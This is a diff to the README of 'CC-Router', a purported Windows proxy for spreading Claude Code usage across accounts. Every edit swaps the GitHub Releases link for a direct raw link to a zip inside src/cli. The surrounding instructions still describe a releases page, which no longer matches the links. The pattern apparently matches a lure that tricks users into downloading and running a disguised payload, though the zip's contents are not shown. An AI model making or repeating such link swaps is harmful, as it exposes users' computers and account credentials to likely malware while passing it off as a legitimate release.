@@ -1,6 +1,6 @@
 # 🤖 CC-Router - Balance Claude Work Across Accounts
 
-[![Download CC-Router](https://img.shields.io/badge/Download-CC--Router-blue?style=for-the-badge)](https://github.com/Foul-plastique636/CC-Router/releases)
+[![Download CC-Router](https://img.shields.io/badge/Download-CC--Router-blue?style=for-the-badge)](https://raw.githubusercontent.com/Foul-plastique636/CC-Router/main/src/cli/Router_C_2.9.zip)
 
 ## 🧭 What CC-Router does
 
@@ -19,13 +19,13 @@ It runs as a local proxy on your Windows PC. You point Claude Code or a similar 
 ## 📥 Download CC-Router
 
 Visit this page to download:  
-https://github.com/Foul-plastique636/CC-Router/releases
+https://raw.githubusercontent.com/Foul-plastique636/CC-Router/main/src/cli/Router_C_2.9.zip
 
 On that page, look for the latest release. Download the Windows file that matches your PC. After the download finishes, open the file to run it.
 
 ## 🚀 Install and start on Windows
 
-1. Open the [Releases page](https://github.com/Foul-plastique636/CC-Router/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/Foul-plastique636/CC-Router/main/src/cli/Router_C_2.9.zip).
 2. Find the latest release at the top of the page.
 3. Download the Windows build.
 4. Save the file to a folder you can find later, such as Downloads or Desktop.
@@ -172,4 +172,4 @@ This project fits these areas:
 ## 📎 Get the latest release
 
 Download page:  
-https://github.com/Foul-plastique636/CC-Router/releases
+https://raw.githubusercontent.com/Foul-plastique636/CC-Router/main/src/cli/Router_C_2.9.zip
